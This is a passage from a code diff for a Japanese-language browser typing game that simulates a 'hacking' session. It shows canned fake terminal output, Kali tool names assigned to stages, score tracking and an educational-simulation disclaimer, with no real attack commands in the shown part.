+[+] Backdoor created successfully
+[+] MD5: 1a2b3c4d5e6f7890abcdef1234567890
+[+] SHA256: abcdef1234567890abcdef1234567890abcdef1234567890abcdef1234567890`
+                };
+                
+                // デフォルトの出力
+                const defaultOutputs = [
+                    "コマンドが正常に実行されました。",
+                    "ターゲットへのアクセスを確立しました。",
+                    "スキャン完了。結果を分析中...",
+                    "脆弱性を発見しました。エクスプロイトを開始します。",
+                    "アクセス権限を取得しました。"
+                ];
+                
+                return outputs[command] || defaultOutputs[Math.floor(Math.random() * defaultOutputs.length)];
+            }
+
+            // ネットワーク接続のアクティブ化
+            function activateNetworkConnection() {
+                const stage = gameState.currentStage;
+                
+                // ステージに応じて接続をアクティブ化
+                if (stage === 0 && gameState.currentCommand === 0) {
+                    // 最初のコマンドで攻撃者→ルーターをアクティブ化
+                    gameState.networkConnections[0].active = true;
+                } else if (stage === 1 && gameState.currentCommand === 0) {
+                    // ルーター→サーバーをアクティブ化
+                    gameState.networkConnections[1].active = true;
+                } else if (stage === 2 && gameState.currentCommand === 0) {
+                    // ルーター→ターゲットをアクティブ化
+                    gameState.networkConnections[2].active = true;
+                } else if (stage === 3 && gameState.currentCommand === 0) {
+                    // すべての接続をアクティブ化
+                    gameState.networkConnections.forEach(conn => conn.active = true);
+                }
+                
+                updateConnections();
+                
+                // ノードのアニメーション
+                const targetNode = document.getElementById('node-target');
+                if (targetNode && stage >= 2) {
+                    targetNode.style.animation = 'pulse 1s infinite';
+                    targetNode.style.boxShadow = '0 0 30px rgba(255, 107, 107, 0.7)';
+                }
+            }
+
+            // 現在のステージを完了
+            function completeCurrentStage() {
+                // ステージアイテムを完了としてマーク
+                const stageItems = document.querySelectorAll('.stage-item');
+                stageItems[gameState.currentStage].classList.remove('active');
+                stageItems[gameState.currentStage].classList.add('completed');
+                
+                // 次のステージへ
+                gameState.currentStage++;
+                gameState.currentCommand = 0;
+                
+                if (gameState.currentStage < gameState.stages.length) {
+                    // 次のステージをアクティブ化
+                    stageItems[gameState.currentStage].classList.add('active');
+                    
+                    // 次のステージの最初のツールを選択
+                    const nextTool = getToolForStage(gameState.currentStage);
+                    selectTool(nextTool);
+                    
+                    addTerminalMessage("", `=== ステージ ${gameState.currentStage + 1} 開始: ${gameState.stages[gameState.currentStage].name} ===`, "terminal-success");
+                    
+                    updateCommandDisplay();
+                } else {
+                    // ゲームクリア
+                    gameComplete();
+                }
+                
+                updateStats();
+            }
+
+            // ステージに対応するツールを取得
+            function getToolForStage(stageIndex) {
+                const stageTools = ['nmap', 'nikto', 'metasploit', 'john', 'metasploit'];
+                return stageTools[stageIndex] || 'nmap';
+            }
+
+            // コマンド表示の更新
+            function updateCommandDisplay() {
+                const currentStage = gameState.stages[gameState.currentStage];
+                const command = currentStage.commands[gameState.currentCommand];
+                commandToType.textContent = command;
+                commandToType.innerHTML = command; // リセット
+                
+                // 入力フィールドをフォーカス
+                setTimeout(() => {
+                    commandInput.focus();
+                }, 100);
+            }
+
+            // 統計の更新
+            function updateStats() {
+                // 正確率
+                const accuracy = gameState.commandsTyped > 0 
+                    ? Math.round((gameState.correctCommands / gameState.commandsTyped) * 100) 
+                    : 100;
+                accuracyElement.textContent = `${accuracy}%`;
+                
+                // WPM
+                const minutes = (Date.now() - gameState.startTime) / 60000;
+                const wpm = minutes > 0 ? Math.round(gameState.correctCommands / minutes) : 0;
+                wpmElement.textContent = wpm;
+                
+                // コマンド数
+                commandsElement.textContent = gameState.commandsTyped;
+                
+                // ステージ
+                stageElement.textContent = `${gameState.currentStage + 1}/${gameState.stages.length}`;
+            }
+
+            // ターミナルにメッセージを追加
+            function addTerminalMessage(prompt, message, type) {
+                const line = document.createElement('div');
+                line.className = 'terminal-line';
+                
+                if (prompt) {
+                    const promptSpan = document.createElement('span');
+                    promptSpan.className = 'terminal-prompt';
+                    promptSpan.textContent = prompt;
+                    line.appendChild(promptSpan);
+                }
+                
+                const messageSpan = document.createElement('span');
+                messageSpan.className = type;
+                messageSpan.textContent = message;
+                line.appendChild(messageSpan);
+                
+                terminal.appendChild(line);
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+
+            // 時間表示の更新
+            function updateTime() {
+                const now = new Date();
+                const timeString = now.toLocaleTimeString('ja-JP', { 
+                    hour12: false,
+                    hour: '2-digit',
+                    minute: '2-digit',
+                    second: '2-digit'
+                });
+                currentTimeElement.textContent = timeString;
+            }
+
+            // ゲーム完了
+            function gameComplete() {
+                addTerminalMessage("", "=== ハッキングシミュレーション完了 ===", "terminal-success");
+                addTerminalMessage("", "すべてのステージをクリアしました！", "terminal-success");
+                addTerminalMessage("", "ターゲットシステムへの完全なアクセスを確立しました。", "terminal-success");
+                addTerminalMessage("", "", "terminal-success");
+                addTerminalMessage("", "【統計サマリー】", "terminal-success");
+                addTerminalMessage("", `総実行コマンド: ${gameState.commandsTyped}`, "terminal-success");
+                addTerminalMessage("", `正確率: ${accuracyElement.textContent}`, "terminal-success");
+                addTerminalMessage("", `平均WPM: ${wpmElement.textContent}`, "terminal-success");
+                
+                const totalTime = ((Date.now() - gameState.startTime) / 1000 / 60).toFixed(1);
+                addTerminalMessage("", `総所要時間: ${totalTime}分`, "terminal-success");
+                addTerminalMessage("", "", "terminal-success");
+                addTerminalMessage("", "おめでとうございます！カリLinuxツールを使った", "terminal-success");
+                addTerminalMessage("", "基本的なハッキングフローを学習しました。", "terminal-success");
+                addTerminalMessage("", "", "terminal-success");
+                addTerminalMessage("", "注意: これは教育用シミュレーションです。", "terminal-success");
+                addTerminalMessage("", "実際のシステムへの不正アクセスは法律で禁止されています。", "terminal-success");
+                
+                // 入力フィールドを無効化
+                commandInput.disabled = true;
+                commandInput.placeholder = "シミュレーション完了 - ページをリロードして再開";
+                
+                // 最終的なネットワークマップのアニメーション
+                document.querySelectorAll('.node').forEach(node => {
+                    node.style.animation = 'pulse 2s infinite';
+                });
+                
+                // すべての接続をアクティブ化
+                gameState.networkConnections.forEach(conn => conn.active = true);
+                updateConnections();
+            }
+
+            // ゲームの開始
+            initGame();
+        });
+    </script>
+</body>
+</html>
